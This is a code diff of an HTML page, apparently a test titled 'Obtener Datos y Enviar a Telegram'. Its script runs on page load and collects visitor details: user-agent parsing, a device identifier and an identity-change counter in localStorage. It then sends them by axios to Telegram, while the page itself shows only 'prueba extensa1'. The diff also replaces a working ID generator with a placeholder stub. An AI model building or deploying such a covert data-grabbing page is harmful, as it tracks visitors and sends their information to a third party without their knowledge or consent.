@@ -2,19 +2,15 @@
 <html>
 <head>
   <title>Obtener Datos y Enviar a Telegram</title>
-  <script src="https://github.com/faisalman/ua-parser-js/blob/072a82b87ba35cc15ae10fd02d905f4b78a8ce05/src/main/ua-parser.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/0.7.28/ua-parser.min.js"></script>
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-  
 </head>
 <body>
   <h1>prueba extensa1</h1>
 
-  
-
   <script>
     // Objeto para almacenar los datos del usuario
     var userData = {};
-
     // Función para enviar datos a Telegram
     function sendToTelegram(message) {
       // Verificar si el mensaje está vacío
@@ -37,7 +33,7 @@
           console.log('Mensaje enviado a Telegram:', response.data);
         })
         .catch(error => {
-          console.error('Error al enviar el mensaje a Telegram:', error);
+          console.error('Error al enviar el mensaje a Telegram:', error.response.data);
         });
     }
 
@@ -67,51 +63,41 @@
       }
 
       // Actualizar la cantidad de veces que el usuario ha cambiado de identidad
-      localStorage.setItem('identityChanges', JSON.stringify(userData));
+      localStorage.setItem('identityChanges', JSON.stringify(getIdentityChanges() + 1));
 
       // Otras acciones que deseas realizar
       // ...
-
     }
-
-        // Obtener la hora actual en formato de 12 horas
+    // Obtener la hora actual en formato de 12 horas
     function getCurrentTime() {
       var now = new Date();
       var hours = now.getHours();
       var minutes = now.getMinutes();
-      var ampm = hours >= 12 ? 'PM' : 'AM';
+
+      // Convertir a formato de 12 horas
+      var period = hours >= 12 ? 'PM' : 'AM';
       hours = hours % 12;
-      hours = hours ? hours : 12; // Si hours es 0, se reemplaza por 12
+      hours = hours ? hours : 12;
       minutes = minutes < 10 ? '0' + minutes : minutes;
-      var time = hours + ':' + minutes + ' ' + ampm;
-      return time;
+
+      return hours + ':' + minutes + ' ' + period;
+    }
+
+    // Generar un identificador único para el dispositivo
+    function generateDeviceIdentifier() {
+      // Lógica para generar el identificador único
+      // ...
+
+      return 'ID_GENERADO'; // Reemplazar con la lógica adecuada
     }
 
     // Obtener la cantidad de veces que el usuario ha cambiado de identidad
     function getIdentityChanges() {
       var identityChanges = localStorage.getItem('identityChanges');
-      if (identityChanges) {
-        identityChanges = JSON.parse(identityChanges);
-        return identityChanges.changes || 0;
-      }
-      return 0;
+      return identityChanges ? JSON.parse(identityChanges) : 0;
     }
 
-    // Generar un identificador único para el dispositivo
-    function generateDeviceIdentifier() {
-      var d = new Date().getTime();
-      if (window.performance && typeof window.performance.now === 'function') {
-        d += performance.now();
-      }
-      var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        var r = (d + Math.random() * 16) % 16 | 0;
-        d = Math.floor(d / 16);
-        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
-      });
-      return uuid;
-    }
-
-    // Llamar a la función para obtener los datos
+    // Llamar a la función para obtener los datos y enviar a Telegram
     getData();
   </script>
 </body>
